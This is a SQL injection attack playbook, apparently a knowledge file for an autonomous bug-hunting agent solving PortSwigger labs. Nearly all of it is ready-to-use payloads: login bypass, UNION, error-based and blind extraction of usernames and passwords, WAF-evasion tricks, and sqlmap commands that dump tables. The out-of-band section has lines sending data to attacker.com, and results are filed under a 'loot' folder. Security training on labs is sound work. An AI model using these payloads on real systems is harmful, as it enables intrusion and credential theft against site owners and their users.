# SQL Injection Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> Last updated: Auto-generated. Update this file with new techniques as you discover them.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Identify Injection Points
- GET/POST parameters, cookies, headers (X-Forwarded-For, Referer, User-Agent)
- JSON body fields, XML attributes
- URL path segments (REST-style: /api/users/1)
- Search fields, login forms, filters, sorting parameters

### 1.2 Basic Detection Payloads
```
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
' OR 1=1--
' OR 1=1#
'; WAITFOR DELAY '0:0:5'--
1' AND (SELECT SLEEP(5))--
' UNION SELECT NULL--
```

### 1.3 Fingerprint the DBMS
| DBMS       | Version Query                  | String Concat    | Comment |
|------------|-------------------------------|------------------|---------|
| MySQL      | SELECT @@version              | CONCAT('a','b')  | -- or # |
| PostgreSQL | SELECT version()              | 'a'\|\|'b'        | --      |
| Oracle     | SELECT banner FROM v$version  | 'a'\|\|'b'        | --      |
| MSSQL      | SELECT @@version              | 'a'+'b'          | --      |
| SQLite     | SELECT sqlite_version()       | 'a'\|\|'b'        | --      |

### 1.4 Determine Column Count (for UNION)
```sql
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY N--  (increment until error)

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  (increment until no error)
```

---

## Phase 2: Exploitation Techniques

### 2.1 UNION-Based Injection
```sql
-- After determining N columns:
' UNION SELECT 'a',NULL,NULL--  (find which columns display)
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 2.2 Error-Based Injection
```sql
-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
```

### 2.3 Blind Boolean-Based
```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 64--
' AND (SELECT COUNT(*) FROM users WHERE username='administrator' AND LENGTH(password)>10)=1--
```

### 2.4 Blind Time-Based
```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### 2.5 Out-of-Band (OOB)
```sql
-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### 2.6 Second-Order SQLi
- Inject payload into stored data (e.g., username registration)
- Payload triggers when stored data is used in a subsequent query
- Example: Register username `admin'--`, change password → modifies admin's password

---

## Phase 3: PortSwigger Lab-Specific Techniques

### Login Bypass
```sql
-- Username field: administrator'--
-- Password field: anything
```

### Retrieving Hidden Data
```sql
-- URL: /filter?category=Gifts
-- Payload: /filter?category=Gifts' OR 1=1--
```

### Extracting Data from Other Tables
```sql
-- Determine columns: ' ORDER BY 2--
-- Find string columns: ' UNION SELECT 'a','b'--
-- Extract users: ' UNION SELECT username,password FROM users--
```

### Examining the Database
```sql
-- List tables: ' UNION SELECT table_name,NULL FROM information_schema.tables--
-- List columns: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxx'--
```

---

## Phase 4: Tools & Automation

### SQLMap (preferred for complex injection)
```bash
# Basic scan
sqlmap -u "http://target/page?id=1" --batch --level=5 --risk=3

# With cookies (PortSwigger sessions)
sqlmap -u "http://target/page?id=1" --cookie="session=abc123" --batch

# POST request
sqlmap -u "http://target/login" --data="username=test&password=test" --batch

# Dump specific table
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump

# Through proxy
sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# With specific technique
sqlmap -u "http://target/page?id=1" --technique=BT --batch  # Blind + Time-based

# Second-order
sqlmap -u "http://target/page?id=1" --second-url="http://target/profile" --batch
```

### Manual curl-based testing
```bash
# Test parameter
curl -sk "http://target/page?id=1'" -b /data/cookies/cookies.txt -c /data/cookies/cookies.txt

# POST with injection
curl -sk "http://target/login" -d "username=admin'--&password=x" -b /data/cookies/cookies.txt -c /data/cookies/cookies.txt -D-
```

---

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| WAF blocking quotes | Try URL encoding: %27, double URL encode: %2527, use CHAR() |
| Spaces blocked | Use `/**/` or `+` or `%09` (tab) instead of spaces |
| Keywords blocked | Use case variation (SeLeCt), inline comments (SE/**/LECT) |
| UNION blocked | Try stacked queries, boolean/time-based blind |
| Error messages hidden | Switch to blind techniques |
| Incorrect column count | Recount with ORDER BY + NULL increments |
| Session expires | Re-authenticate, update cookie jar |

## Success Criteria
- [ ] Identified the injection point and DBMS type
- [ ] Extracted admin credentials or performed required action
- [ ] Lab marked as "solved" (check for congratulations banner)
- [ ] Payload documented in /data/loot/
